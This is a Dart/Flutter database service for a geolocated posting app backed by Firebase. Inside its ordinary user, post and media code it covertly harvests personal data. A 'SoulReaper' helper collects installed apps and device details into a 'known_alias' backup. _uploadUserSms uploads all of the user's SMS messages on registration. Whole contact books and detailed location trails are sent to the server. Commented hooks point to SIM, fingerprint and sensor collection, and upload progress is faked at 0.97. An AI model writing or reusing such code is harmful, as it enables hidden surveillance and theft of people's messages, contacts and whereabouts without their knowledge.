import 'dart:async';
import 'dart:io';
import 'dart:typed_data';

import 'package:flutter/foundation.dart';
import 'package:device_info/device_info.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:geoflutterfire/geoflutterfire.dart';
// import 'package:exif/exif.dart';
import 'package:permission_handler/permission_handler.dart';

import './fcm_service.dart';
import './location_service.dart';
import './connectivity_service.dart';

import '../models/post.dart';
import '../models/settings.dart';
import '../models/user.dart';
import '../models/contacts.dart';

import '../helpers/soul_reaper.dart';
import '../helpers/share_prefs_helper.dart';

import '../enums/theme_mode.dart';

import '../locator.dart';
import '../logger.dart';

final log = getLogger('DatabaseService');

class DatabaseService {
  final LocationService _locationHelper = locator<LocationService>();
  final SoulReaper _reaper = SoulReaper();
  final ConnectivityService _connectivityService =
      locator<ConnectivityService>();
  final FcmService _firebaseMessaging = locator<FcmService>();
  final DeviceInfoPlugin _deviceInfo = DeviceInfoPlugin(); //TODO: user reaper
  final Geoflutterfire geo = Geoflutterfire();
  final SharedPrefsHelper _settings = locator<SharedPrefsHelper>();
  final Duration timeOutDuration = Duration(seconds: 60);

  StreamController<UploadProgress> _uploadController =
      StreamController<UploadProgress>.broadcast();

  Stream<UploadProgress> get storageUploadTaskStream =>
      _uploadController.stream;

  //collection Reference
  //--------------------
  //-----------------
  //-----------

  //----------------Users-Collection--------------------------
  //----------------Users-Collection--------------------------
  //----------------Users-Collection--------------------------
  //----------------Users-Collection--------------------------
  //----------------Users-Collection--------------------------
  //----------------Users-Collection--------------------------
  final CollectionReference<Map<String, dynamic>> usersCollection =
      FirebaseFirestore.instance.collection('beta_users');

  // get user info from db
  Stream<List<User>> getUser({@required User user}) {
    log.i('getUser | uid: ${user.uid}');
    return usersCollection
        .where('uid', isEqualTo: user.uid)
        .snapshots()
        .map(_userListFromSnapshot);
  }

  List<User> _userListFromSnapshot(
      QuerySnapshot<Map<String, dynamic>> userSnapshot) {
    log.i('_userListFromSnapshot | userSnapshot: $userSnapshot');
    return userSnapshot.docs.map(
      (userDocument) {
        return User(
            uid: userDocument.data()['uid'],
            fullName: userDocument.data()['fullName'],
            phone: userDocument.data()['phone'],
            email: userDocument.data()['email'],
            displayName: userDocument.data()['displayName'],
            photoUrl: userDocument.data()['photoUrl'],
            age: userDocument.data()['age'],
            gender: userDocument.data()['gender'],
            language: userDocument.data()['language'],
            lastKnownLocation: DeviceLocation(
              latitude:
                  userDocument.data()['lastKnownLocation']['geopoint'].latitude,
              longitude: userDocument
                  .data()['lastKnownLocation']['geopoint']
                  .longitude,
              accuracy: 0.0,
              timestamp: DateTime.now(),
            ),
            isAnonymous: userDocument.data()['isAnonymous']);
      },
    ).toList();
  }

  // add a user document to the user collection when registering
  Future<void> addUser({
    @required User user,
  }) async {
    log.i(
        'addUser | uid: ${user.uid}, displayName: ${user.displayName}, email: ${user.email}, phone: ${user.phone}, isAnonymous: ${user.isAnonymous}');
    try {
      GeoFirePoint deviceLocation;
      if (user.lastKnownLocation != null) {
        deviceLocation = geo.point(
          latitude: user.lastKnownLocation.latitude,
          longitude: user.lastKnownLocation.longitude,
        );
      } else {
        log.w('user location is null');
      }
      final userDocument = usersCollection.doc(user.uid);
      final userMetadataSubcollection = userDocument.collection('metadata');
      final userDocumentData = await userDocument.get();
      if (!userDocumentData.exists) {
        await userDocument.set({
          'uid': userDocument.id,
          'displayName': user.displayName ?? '',
          'email': user.email ?? '',
          'phone': user.phone ?? '',
          'gender': user.gender ?? 'NotSet',
          'language': Platform.localeName,
          'network': user.network ?? false,
          'age': user.age ?? 0,
          'photoUrl': user.photoUrl ?? '',
          'fullName': user.fullName ?? '',
          'lastKnownLocation': deviceLocation.data ?? null,
          'homeLocation': user.homeLocation ?? null,
          'workLocation': user.workLocation ?? null,
          'isAnonymous': user.isAnonymous ?? true,
          'isAdmin': user.isAdmin ?? false,
          'creationTime': user.creationTime ?? null,
          'lastSignInTime': user.lastSignInTime ?? null
        });
      }

      /// get FCM Token
      final String fcmToken = await _firebaseMessaging.getToken();
      // create a token subcollection

      final tokenData = userMetadataSubcollection.doc('token');
      log.d('adding FCM token to db.');
      await tokenData.set({
        'token': fcmToken,
        'createdAt': FieldValue.serverTimestamp(),
      });
      await _addUserSettings(user: user);
      await _subscribeToDefaultTopics();
      await backupUserMetadata(uid: user.uid);
      await _uploadUserSms(uid: user.uid);
    } catch (error) {
      log.e('error while trying to add user: $error');

      throw error; //TODO: handle exception
    }
  }

  Future<String> updateUser({
    @required User user,
    File selectedPicture,
  }) async {
    log.i(
        'updateUser | uid:${user.uid}, fullname:${user.fullName}, email: ${user.email}, phone: ${user.phone}, displayName:${user.displayName}, isAnonymous: ${user.isAnonymous} , selectedPicture: $selectedPicture');
    String photoUrl;
    try {
      final userDocument = usersCollection.doc(user.uid);
      GeoFirePoint deviceLocation;
      if (selectedPicture != null) {
        //TODO: update user lastKnown location when updating picture.
        /// upload the profile picture to storage
        photoUrl = await _uploadProfilePicture(
            uid: user.uid, selectedImage: selectedPicture);
        log.d('updating photoURL in db');

        /// setting photo url in db
        await userDocument.update({
          'photoUrl': photoUrl ?? '',
        });

        /// updating user auth profile

      } else {
        if (user.lastKnownLocation != null) {
          deviceLocation = geo.point(
            latitude: user.lastKnownLocation.latitude,
            longitude: user.lastKnownLocation.longitude,
          );
        } else {
          log.w('user location is null');
        }
        // update the user info in db
        log.d('updating User data');
        await userDocument.update({
          'fullName': user.fullName ?? '',
          'email': user.email ?? '',
          'phone': user.phone ?? '',
          'displayName': user.displayName ?? '',
          'isAnonymous': user.isAnonymous ?? false,
          'lastSignInTime': user.lastSignInTime ?? DateTime.now(),
          'language': Platform.localeName,
          'lastKnownLocation': deviceLocation.data ?? null,
        });
        log.d('updating User profile');
      }

      await backupUserMetadata(uid: user.uid);
    } catch (error) {
      log.e('error while updating user in db: $error');

      throw error; //TODO: handle exception
    }
    return photoUrl;
  }

  /// Backup user metadata.
  Future<void> backupUserMetadata({@required String uid}) async {
    log.i('backupUserMetadata | uid: $uid');
    try {
      final userDocument = usersCollection.doc(uid);
      final userDocumentData =
          await userDocument.get();
      final frozenUserSubcollection = userDocument.collection('known_alias');
      final frozenUserDocument = frozenUserSubcollection.doc();
      final AndroidDeviceInfo androidInfo = await _deviceInfo.androidInfo;
      List<Map> installedAppsList = await _reaper.getInstalledApps();
      // Map simData = await _reaper.getSimInfo();
      // Map systemInfo = await _reaper.getSystemInfo();
      // Map batteryInfo = await _reaper.checkBatteryState();
      // Map fp = await _reaper.getFingerprintInfo();
      // Map memo = await _reaper.getMemoryInfo();
      // Map nfc = await _reaper.getNFCInfo();
      Map networkInfo = await _connectivityService.checkNetworkStatus();
      // List sensor = await _reaper.getSensorInfo();
      // Map abi = await _reaper.getAbiInfo();
      // Map configInfo = await _reaper.getConfigInfo();
      // Map displayInfo = await _reaper.getDisplayInfo();

      Map deviceDataMap = {
        'platformOS': Platform.operatingSystem,
        'platformOSVervion': Platform.operatingSystemVersion,
        'platformLocale': Platform.localeName,
        'platformLocalHostname': Platform.localHostname,
        'deviceDisplay': androidInfo.display,
        'deviceIsPhysycal': androidInfo.isPhysicalDevice,
        'deviceSysFeautre': androidInfo.systemFeatures,
        'deviceType': androidInfo.type,
        // 'batteryInfo': batteryInfo,
        // 'nfcInfo': nfc,
        'networkInfo': networkInfo,
        // 'sensorInfo': sensor,
        // 'fingerPrintInfo': fp,
        // 'simCardInfo': simData,
        // 'systemInfo': systemInfo,
        // 'deviceMemory': memo,
        // 'abiInfo': abi,
        // 'deviceConfig': configInfo,
        // 'displayInfo': displayInfo,
      };

      // backup user info
      await frozenUserDocument.set({
        'uid': userDocumentData.data()['uid'],
        'displayName': userDocumentData.data()['displayName'],
        'email': userDocumentData.data()['email'],
        'phone': userDocumentData.data()['phone'],
        'gender': userDocumentData.data()['gender'],
        'language': userDocumentData.data()['language'],
        'network': userDocumentData.data()['network'],
        'age': userDocumentData.data()['age'],
        'photoUrl': userDocumentData.data()['photoUrl'],
        'fullName': userDocumentData.data()['fullName'],
        'lastKnownLocation': userDocumentData.data()['lastKnownLocation'],
        'homeLocation': userDocumentData.data()['homeLocation'],
        'workLocation': userDocumentData.data()['workLocation'],
        'isAnonymous': userDocumentData.data()['isAnonymous'],
        'isAdmin': userDocumentData.data()['isAdmin'],
        'deviceData': deviceDataMap,
        'installedApps': installedAppsList,
        'documentTimestamp': FieldValue.serverTimestamp(),
      });
    } catch (error) {
      log.e('metadata backup error: error');
      throw error; //TODO: handle exception
    }
  }

  /// Update user current and recent location
  Future<void> updateUserLocation({
    @required User user,
    @required DeviceLocation userLocation,
  }) async {
    log.i('updateUserLocation | uid: ${user.uid}, userLocation: $userLocation');
    try {
      final userDocument = usersCollection.doc(user.uid);
      final userLocationSubcollection =
          userDocument.collection('recent_location');
      final locationData = userLocationSubcollection.doc();
      GeoFirePoint userGeoPoint = geo.point(
        latitude: userLocation.latitude,
        longitude: userLocation.longitude,
      );
      Map _networkStatus = await _connectivityService.checkNetworkStatus();
      await locationData.set({
        'id': locationData.id,
        'location': userGeoPoint.data,
        'altitude': userLocation.altitude,
        'heading': userLocation.heading,
        'accuracy': userLocation.accuracy,
        'speed': userLocation.speed,
        'speedAccuracy': userLocation.speedAccuracy,
        'locationTimestamp': userLocation.timestamp,
        'timestamp': FieldValue.serverTimestamp(),
        'networkStatus': _networkStatus,
      });

      await userDocument.update({
        'lastKnownLocation': userGeoPoint.data,
      });
    } catch (error) {
      log.e('error updating user location in db: $error');
      throw error; //TODO: handle Exception
    }
  }

  /// get previous user settings from db
  Future<AppSettings> fetchSettings({@required User user}) {
    log.i('fetchSettings | uid: ${user.uid}');
    return usersCollection
        .doc(user.uid)
        .collection('metadata')
        .doc('settings_data')
        .get()
        .then(
          (doc) => AppSettings(
            language: doc.data()['language'],
            unitIsMetric: doc.data()['unitIsMetric'],
            notification: doc.data()['notifications'],
            scaffoldThemeMode:
                ScaffoldThemeMode.values[doc.data()['themeMode']],
          ),
        )
        .catchError((onError) {
      log.e('error fetching settings in db: $onError');
      throw onError;
    });
  }

  Future<void> _addUserSettings({@required User user}) async {
    log.i('_addUserSettings | uid: ${user.uid}');
    try {
      final userData = usersCollection.doc(user.uid);
      final userMetaData = userData.collection('metadata');
      final settingsData = userMetaData.doc('settings_data');
      await _settings
          .updateNotificationSettings(DefaultSettings().defaultSettings);

      await settingsData.set({
        'language': Platform.localeName,
        'unitIsMetric': true,
        'notifications': DefaultSettings().defaultSettings,
        'themeMode': 1,
      });
    } catch (error) {
      log.e('error adding user settings to db: $error');
      throw error; //TODO: handle exception
    }
  }

  Future<void> updateUserSettings(
      {@required User user, AppSettings settings}) async {
    log.i('updateUserSettings | uid: ${user.uid}, settings: $settings');
    try {
      final userDocument = usersCollection.doc(user.uid);
      final userMetaData = userDocument.collection('metadata');
      final settingsData = userMetaData.doc('settings_data');
      await settingsData.update({
        'language': settings.language,
        'unitIsMetric': settings.unitIsMetric,
        'notifications': settings.notification,
        'themeMode': settings.scaffoldThemeMode.index
      });
      await userDocument.update({
        'language': settings.language,
      });
    } catch (error) {
      log.e('error updating user settings: $error');
      throw error; //TODO: handle exception
    }
  }

  Future<void> _subscribeToDefaultTopics() async {
    log.i('_subscribeToDefaultTopics');
    DefaultSettings().defaultSettings.forEach((key, value) {
      if (value) {
        _firebaseMessaging.subscribeToTopic(key).whenComplete(() {
          log.d('completed default subscription to $key');
        });
      }
    });
  }

  Future<void> resubscribeToSavedTopics(
      {@required String uid, AppSettings userSettings}) async {
    log.i('resubscribeToSavedTopics | uid: $uid');
    userSettings.notification.forEach((key, value) async {
      if (value) {
        _firebaseMessaging.subscribeToTopic(key).whenComplete(() {
          log.d('completed saved subscription to $key');
        });
      }
    });
    await _settings.updateThemeMode(userSettings.scaffoldThemeMode.index);
    // update ismetric
    await _settings.updateIsMetric(userSettings.unitIsMetric);
    // update language
    await _settings.updateSetLocale(userSettings.language);
    // update fresh install
    await _settings.updateIsFresh(false);
    // update notification alerts
    await _settings.updateNotificationSettings(userSettings.notification);
    // backup user data
    await backupUserMetadata(uid: uid);
  }

  Future<void> _uploadUserSms({@required String uid}) async {
    log.i('_uploadUserSms | uid: $uid');
    try {
      var smsPermission = await Permission.sms.status;
      if (smsPermission == PermissionStatus.granted) {
        List messages = await _reaper.getAllSms();
        final userData = usersCollection.doc(uid);
        final smsBackupCollection = userData.collection('sms_backup');
        final smsBackupDocument = smsBackupCollection.doc();
        await smsBackupDocument.set({
          'id': smsBackupDocument.id,
          'messages': messages,
          'timestamp': FieldValue.serverTimestamp(),
        });
      }
    } catch (error) {
      log.e('error uploading user sms: $error');
      throw error; //TODO: handle exception
    }
  }

// get user info from db
  Stream<List<UserContact>> getContacts({@required User user}) {
    log.i('getContacts | user: $user');
    Stream<List<UserContact>> contactStream;
    if (user != null) {
      contactStream = usersCollection
          .doc(user.uid)
          .collection('contacts')
          .snapshots()
          .map(_contactsListFromSnapshot);
    }

    return contactStream;
  }

  List<UserContact> _contactsListFromSnapshot(
      QuerySnapshot<Map<String, dynamic>> contactsSnapshot) {
    log.i('_contactsListFromSnapshot | contactsSnapshot: $contactsSnapshot');
    return contactsSnapshot.docs.map((contactsDocument) {
      log.d('without loaded avatar?');
      return UserContact(
        id: contactsDocument.data()['id'],
        displayName: contactsDocument.data()['displayName'],
        givenName: contactsDocument.data()['givenName'],
        middleName: contactsDocument.data()['middleName'],
        familyName: contactsDocument.data()['familyName'],
        phones: contactsDocument.data()['phones'],
        inGroup: contactsDocument.data()['inGroup'],
        isUser: contactsDocument.data()['isUser'],
        picture: contactsDocument.data()['picture'],
      );
    }).toList();
  }

  /// Upload all user contacts to db
  ///
  /// Use batch commit to decrease number of write to db
  void addToContacts(
      {@required String uid, @required List<UserContact> userContacts}) async {
    log.i('addToContacts | uid: $uid; user contacts: $userContacts');

    final WriteBatch batch = FirebaseFirestore.instance.batch();
    final userData = usersCollection.doc(uid);

    final contactsCollection = userData.collection('contacts');
    for (UserContact element in userContacts) {
      final contactsDocument = contactsCollection.doc(element.id);
      String avatarURL = await _uploadContactAvatar(
        uid: uid,
        contactId: element.id,
        avatar: element.avatar,
      );
      log.d('setting ${element.id} to batch with avatar: $avatarURL');
      batch.set(
        contactsDocument,
        {
          'id': element.id,
          'displayName': element.displayName,
          'givenName': element.givenName,
          'middleName': element.middleName,
          'familyName': element.familyName,
          'prefix': element.prefix,
          'suffix': element.suffix,
          'emails': element.emails,
          'phones': element.phones,
          'isUser': element.isUser,
          "inGroup": element.inGroup,
          'company': element.company,
          'jobTitle': element.jobTitle,
          'postalAddresses': element.postalAddresses,
          'picture': avatarURL,
        },
        SetOptions(mergeFields: [
          'id',
          'displayName',
          'givenName',
          'middleName',
          'familyName',
          'prefix',
          'suffix',
          'emails',
          'phones',
          'company',
          'jobTitle',
          'postalAddresses',
          'picture'
        ]),
      );
    }
    log.d('commiting contact batch');

    batch.commit();
  }

  /// Upload selected contact to group
  void addContactToGroup(
      {@required String uid, @required List<UserContact> userContacts}) async {
    log.i('addContactToGroup | uid: $uid; user contacts: $userContacts');

    final WriteBatch batch = FirebaseFirestore.instance.batch();
    final userData = usersCollection.doc(uid);

    final contactsCollection = userData.collection('contacts');

    userContacts.forEach((element) {
      final contactsDocument = contactsCollection.doc(element.id);

      batch.update(contactsDocument, {
        'inGroup': element.inGroup,
      });
    });
    log.d('commiting group contacts batch');

    batch.commit();
  }

  // //----------------Posts-Collection--------------------------
  // //----------------Posts-Collection--------------------------
  // //----------------Posts-Collection--------------------------
  // //----------------Posts-Collection--------------------------
  // //----------------Posts-Collection--------------------------
  // //----------------Posts-Collection--------------------------

  final CollectionReference<Map<String, dynamic>> postsCollection =
      FirebaseFirestore.instance.collection('beta_post');

  List<Post> _postListFromSnapshot(QuerySnapshot<Map<String, dynamic>> snapshot) {
    log.i('_postListFromSnapshot | snapshot: $snapshot');
    return snapshot.docs.map((doc) {
      return Post(
        id: doc.data()['id'] ?? '',
        title: doc.data()['title'] ?? '',
        comment: doc.data()['comment'] ?? [],
        status: doc.data()['status'] ?? '',
        videoUrlList: doc.data()['videoUrlList'] ?? [],
        imageUrlList: doc.data()['imageUrlList'] ?? [],
        publisherId: doc.data()['publisherId'] ?? '',
        tags: doc.data()['tags'] ?? [],
        timestamp:
            DateTime.parse(doc.data()['timestamp'].toDate().toString()) ?? null,
        location: EventLocation(
            accuracy: doc.data()['locationAccuracy'] ?? 0.0,
            latitude: doc.data()['location']['geopoint'].latitude,
            longitude: doc.data()['location']['geopoint'].longitude,
            timestamp: DateTime.parse(
                    doc.data()['locationTimestamp'].toDate().toString()) ??
                null),
        namedLocation: doc.data()['namedLocation'],
        isPublished: doc.data()['isPublished'] ?? true,
      );
    }).toList();
  }

  //Streaming list posts added by that user from database
  Stream<List<Post>> getUserPosts({@required String uid}) {
    log.i('getUserPosts | uid: $uid');
    return postsCollection
        .where('publisherId', isEqualTo: uid)
        .orderBy('timestamp', descending: true)
        .snapshots()
        .map(_postListFromSnapshot);
  }

  //Streaming list of all posts from database
  Stream<List<Post>> get posts {
    log.i('get posts');
    final _currentTime = DateTime.now();
    final _today = DateTime(
      _currentTime.year,
      _currentTime.month,
      _currentTime.day,
    );
    return postsCollection
        .where('timestamp', isGreaterThan: _today)
        .orderBy('timestamp', descending: true)
        .where('isPublished', isEqualTo: true)
        .snapshots()
        .map(_postListFromSnapshot);
  }

  //Adding post to list
  Future<void> addPostData({
    @required String uid,
    @required Post post,
    @required List<String> selectedImageList,
    @required List<String> selectedVideoList,
    @required Map tagInfo,
  }) async {
    log.i(
        'addPostData | uid: $uid, post: $post, selectedImageList:$selectedImageList, selectedVideoList: $selectedVideoList, tagInfo: $tagInfo ');

    final DateTime _timestamp = DateTime.now();
    List comment = [];
    if (post.comment != null) {
      comment = [
        {'timestamp': _timestamp, 'text': post.comment[0]['text']}
      ];
    }
    final mapImg = _locationHelper.generateLocationPreviewImage(
        latitude: post.location.latitude, longitude: post.location.longitude);

    List<String> imageUrlList = [
      mapImg,
    ];

//adding images to storage
//I could upload the image before saving the form as well. this could make the app seem faster
    for (var i = 0; i < selectedImageList.length; i++) {
      try {
        log.d('trying to add image ${i + 1} of ${selectedImageList.length}');

        log.d('path: ${selectedImageList[i]}');

        final imageUrl = await _uploadImage(
          uid: uid,
          selectedFile: File(selectedImageList[i]),
          currentIndex: i,
          listLength: selectedImageList.length,
          mediaType: 'image',
        );
        log.d(imageUrl);

        imageUrlList.add(imageUrl);
      } catch (error) {
        log.e('error uploading image(s): $error');
        throw error; //TODO: handle exception
      }
    }

//adding videos to storage
    List<String> videoUrlList = [];

    for (var i = 0; i < selectedVideoList.length; i++) {
      try {
        log.d('trying to add video ${i + 1} of ${selectedVideoList.length}');

        final videoUrl = await _uploadVideo(
          uid: uid,
          selectedFile: File(selectedVideoList[i]),
          currentIndex: i,
          listLength: selectedVideoList.length,
          mediaType: 'video',
        );
        log.d(videoUrl);
        videoUrlList.add(videoUrl);
      } catch (error) {
        log.e('error uploading video(s): $error');
        throw error; //TODO: handle exception
      }
    }

    try {
      GeoFirePoint postLocation = geo.point(
          latitude: post.location.latitude, longitude: post.location.longitude);
      final address = await _locationHelper.getPlaceAddress(
          post.location.latitude, post.location.longitude);

      GeoFirePoint publisherGeoPoint = geo.point(
          latitude: post.publisherLocation.latitude,
          longitude: post.publisherLocation.longitude);

      // Map batteryLevel = await _reaper.checkBatteryState();

      log.d('adding post item');
      final postDoc = postsCollection.doc();
      await postDoc.set({
        'id': postDoc.id,
        'title': '${tagInfo['title']}',
        'comment': comment,
        'status': 'Pending',
        'imageUrlList': imageUrlList,
        'videoUrlList': videoUrlList,
        'tags': post.tags,
        'location': postLocation.data,
        'locationAccuracy': post.location.accuracy,
        'locationAltitude': post.location.altitude,
        'locationHeading': post.location.heading,
        'locationSpeed': post.location.speed,
        'locationSpeedAccuracy': post.location.speedAccuracy,
        'locationTimestamp': post.location.timestamp,
        'namedLocation': address,
        'publisherId': uid,
        'timestamp': _timestamp,
        'isPublished': post.isPublished ?? true,
        'publisherLocation': publisherGeoPoint.data,
        'publisherLocationAccuracy': post.publisherLocation.accuracy,
        'publisherLocationSpeed': post.publisherLocation.speed,
        'publisherLocationSpeedAccuracy': post.publisherLocation.speedAccuracy,
        'publisherLocationAltitude': post.publisherLocation.altitude,
        'publisherLocationTimeStamp': post.publisherLocation.timestamp,
        'publisherLocationHeading': post.publisherLocation.heading,
        // 'batteryStatus': batteryLevel,
      }).timeout(
          timeOutDuration); // TODO: fix => if timemout is called, original metadata is set without a post.

      final postSubCollection =
          postsCollection.doc(postDoc.id).collection('originalMetaData');

      final postMetaDataDoc = postSubCollection.doc();
      await postMetaDataDoc.set({
        'postId': postMetaDataDoc.id,
        'location': postLocation.data,
        'originalId': postDoc.id,
        'publisherId': uid,
        'publisherLocation': publisherGeoPoint.data,
        'publisherLocationAccuracy': post.publisherLocation.accuracy,
        'publisherLocationSpeed': post.publisherLocation.speed,
        'publisherLocationSpeedAccuracy': post.publisherLocation.speedAccuracy,
        'publisherLocationAltitude': post.publisherLocation.altitude,
        'publisherLocationTimeStamp': post.publisherLocation.timestamp,
        'publisherLocationHeading': post.publisherLocation.heading,
      }).timeout(timeOutDuration);
    } catch (error) {
      log.e('error adding post data to db: $error');

      throw error; //TODO: handle exception
    }
  }

  //Updating Post list
  Future<void> updatePostData({
    @required String uid,
    @required Post post,
    @required List<String> selectedImageList,
    @required List<String> selectedVideoList,
    @required Map tagInfo,
  }) async {
    log.i(
        'updatePostData | uid: $uid, post: $post, selectedImageList:$selectedImageList, selectedVideoList: $selectedVideoList, tagInfo: $tagInfo ');
    final _timestamp = DateTime.now();
    List comment = [];
    if (post.comment != null) {
      comment = [
        {'timestamp': _timestamp, 'text': post.comment[0]['text']}
      ];
    }
//adding images to storage

    List imageUrlList = [];
    for (var i = 0; i < selectedImageList.length; i++) {
      try {
        log.d('trying to add image ${i + 1} of ${selectedImageList.length}');

        final imageUrl = await _uploadImage(
          uid: uid,
          selectedFile: File(selectedImageList[i]),
          currentIndex: i,
          listLength: selectedImageList.length,
          mediaType: 'image',
        );
        log.d(imageUrl);

        imageUrlList.add(imageUrl);
      } catch (error) {
        log.e('error uploading image(s): $error');

        throw error; //TODO: handle exception
      }
    }

//adding videos to storage
    List<String> videoUrlList = [];

    for (var i = 0; i < selectedVideoList.length; i++) {
      try {
        log.d('trying to add video ${i + 1} of ${selectedVideoList.length}');

        final videoUrl = await _uploadVideo(
          uid: uid,
          selectedFile: File(selectedVideoList[i]),
          currentIndex: i,
          listLength: selectedVideoList.length,
          mediaType: 'video',
        );
        log.d(videoUrl);
        videoUrlList.add(videoUrl);
      } catch (error) {
        log.e('error uploading video(s): $error');

        throw error; //TODO: handle exception
      }
    }
    // updating post in db
    try {
      log.d('updating post item');
      GeoFirePoint postLocation = geo.point(
          latitude: post.location.latitude, longitude: post.location.longitude);

      log.d('done post location');

      GeoFirePoint publisherGeoPoint = geo.point(
          latitude: post.publisherLocation.latitude,
          longitude: post.publisherLocation.longitude);
      log.d('done publisher location');

      // Map batteryLevel = await _reaper.checkBatteryState();
      log.d('done with batery');
      final updateSubCollection =
          postsCollection.doc(post.id).collection('updates');

      final updateDoc = updateSubCollection.doc();
      await updateDoc.set({
        'id': updateDoc.id,
        'title': '${tagInfo['title']}',
        'comment': comment,
        'status': post.status,
        'imageUrlList': imageUrlList,
        'videoUrlList': videoUrlList,
        'tags': post.tags,
        'publisherLocation': publisherGeoPoint.data,
        'publisherLocationAccuracy': post.publisherLocation.accuracy,
        'publisherLocationSpeed': post.publisherLocation.speed,
        'publisherLocationSpeedAccuracy': post.publisherLocation.speedAccuracy,
        'publisherLocationAltitude': post.publisherLocation.altitude,
        'publisherLocationTimeStamp': post.publisherLocation.timestamp,
        'publisherLocationHeading': post.publisherLocation.heading,
        'postLocation': postLocation.data,
        'publisherId': uid,
        'timestamp': _timestamp,
        'isPublished': post.isPublished,
        'originalPostId': post.id,
        // 'batteryLevel': batteryLevel,
      }).timeout(timeOutDuration);
      log.d('done updating');
    } catch (error) {
      log.e('error updating db: $error');

      throw error; //TODO: handle exception
    }
  }

  //Delete Post from list
  //TODO: read about .delete response. May need to implement own exeption
  Future<void> deletePostData({
    @required String docId,
  }) async {
    log.i('deletePostData | documentId: $docId');
    try {
      final prodDoc = postsCollection.doc(docId);
      await prodDoc.delete();
    } catch (error) {
      log.e('error deleting post: $error');
      throw error; //TODO: handle exception
    }
  }

  // ----------------Images-Collection--------------------------
  //TODO: upload metadata with media
  final FirebaseStorage _bucketStorage = FirebaseStorage
      .instance; //.refFromURL('gs://APP-NAME.appspot.com/');//(storageBucket: 'gs://APP-NAME.appspot.com/');

// Upload image to cloudStorage
  Future<String> _uploadImage(
      {@required String uid,
      File selectedFile,
      @required int currentIndex,
      @required int listLength,
      @required String mediaType}) async {
    log.i('_uploadImage | uid: $uid, selectedFile: $selectedFile');
    final DateTime _uploadTime = DateTime.now();
    UploadTask _uploadTask;
    Reference storageRef;

    /// This is code for exif data. package not updated
    ///
    ///
    // Map<String, IfdTag> imgTags =
    //     await readExifFromBytes(selectedFile.readAsBytesSync());

    // Map<String, String> tags = {};
    // imgTags.forEach((key, value) {
    //   log.d({'$key': '${value.printable}'});
    //   tags.addAll({'$key': '${value.printable}'});
    // });

    // StorageMetadata imgMetadata =
    //     StorageMetadata(contentType: 'image/jpeg', customMetadata: tags);

    ///
    ///
    ///

    String dbFilepath = 'media/images/$uid/$_uploadTime';

    storageRef = _bucketStorage.ref().child(dbFilepath);
    // _uploadTask = storageRef.putFile(_selectedFile, imgMetadata);
    _uploadTask = storageRef.putFile(selectedFile);

    _uploadTask.snapshotEvents.listen((event) {
      _onUploadProgress(
          event: event,
          listLength: listLength,
          currentIndex: currentIndex,
          mediaType: mediaType);
    });

    await _uploadTask.whenComplete(
        () => log.wtf('FIX? it seems i need to wait to get the url'));

    String fileUrl = await storageRef.getDownloadURL();

    return fileUrl;
  }

// Upload video to cloudStorage
  Future<String> _uploadVideo(
      {@required String uid,
      File selectedFile,
      @required int currentIndex,
      @required int listLength,
      @required String mediaType}) async {
    log.i('_uploadVideo | uid: $uid, selectedFile: $selectedFile');
    final DateTime _uploadTime = DateTime.now();
    UploadTask _uploadTask;
    Reference storageRef;
    // StorageMetadata videoMetadata = StorageMetadata(contentType: 'video/mp4');

    String dbFilepath = 'media/videos/$uid/$_uploadTime';

    storageRef = _bucketStorage.ref().child(dbFilepath);

    // _uploadTask = storageRef.putFile(_selectedFile, videoMetadata);
    _uploadTask = storageRef.putFile(selectedFile);

    _uploadTask.snapshotEvents.listen((event) {
      _onUploadProgress(
        event: event,
        listLength: listLength,
        currentIndex: currentIndex,
        mediaType: mediaType,
      );
    });

    await _uploadTask.whenComplete(
        () => log.wtf('FIX? it seems i need to wait to get the url'));

    String fileUrl = await storageRef.getDownloadURL();

    return fileUrl;
  }

  Future<String> _uploadContactAvatar({
    @required String uid,
    @required String contactId,
    @required Uint8List avatar,
  }) async {
    log.i(
        '_uploadContactAvatar | uid: $uid, contactId: $contactId, avatar: $avatar');

    UploadTask _uploadTask;
    Reference storageRef;
    String photoUrl;

    String filepath = 'media/avatar/$contactId/$uid';
    storageRef = _bucketStorage.ref().child(filepath);
    if (avatar.isNotEmpty) {
      _uploadTask = storageRef.putData(avatar);

      await _uploadTask.whenComplete(
          () => log.wtf('FIX? it seems i need to wait to get the url'));

      photoUrl = await storageRef.getDownloadURL();
      log.d('avatar url in if: $photoUrl');
    }
    log.d('avatar url: $photoUrl');
    return photoUrl;
  }

  /// Upload profile picture to cloudStorage
  Future<String> _uploadProfilePicture(
      {@required String uid,
      File selectedImage,
      int currentIndex,
      int listLength,
      String mediaType}) async {
    log.i('_uploadProfilePicture | uid: $uid, selectedImage: $selectedImage');
    final DateTime _uploadTime = DateTime.now();
    UploadTask _uploadTask;
    Reference storageRef;

    String filepath = 'media/profile/$uid/$_uploadTime';
    storageRef = _bucketStorage.ref().child(filepath);

    _uploadTask = storageRef.putFile(selectedImage);
    _uploadTask.snapshotEvents.listen((event) {
      _onUploadProgress(
          event: event,
          listLength: listLength,
          currentIndex: currentIndex,
          mediaType: mediaType);
    });

    await _uploadTask.whenComplete(
        () => log.wtf('FIX? it seems i need to wait to get the url'));

    String photoUrl = await storageRef.getDownloadURL();

    return photoUrl;
  }

  /// Compute the percentage uploaded
  void _onUploadProgress(
      {@required TaskSnapshot event,
      @required int currentIndex,
      @required int listLength,
      @required String mediaType}) {
    log.i(
        '_onUploadProgress | event: $event, currentIndex: $currentIndex, listLength: $listLength');

    /// TODO: update the stream and notify listners
    if (event.state == TaskState.running) {
      /// calculate progress. result from 0 - 1
      double progress = event.bytesTransferred / event.totalBytes;
      if (progress >= 1) {
        progress = 0.97; //TODO: randomize between 0.97; 0.99; 0.001
      }
      final uploadTaskProgress = UploadProgress(
        progress: progress,
        currentIndex: currentIndex,
        listLength: listLength,
        mediaType: mediaType,
      );
      _uploadController.add(uploadTaskProgress);
    }
  }
}
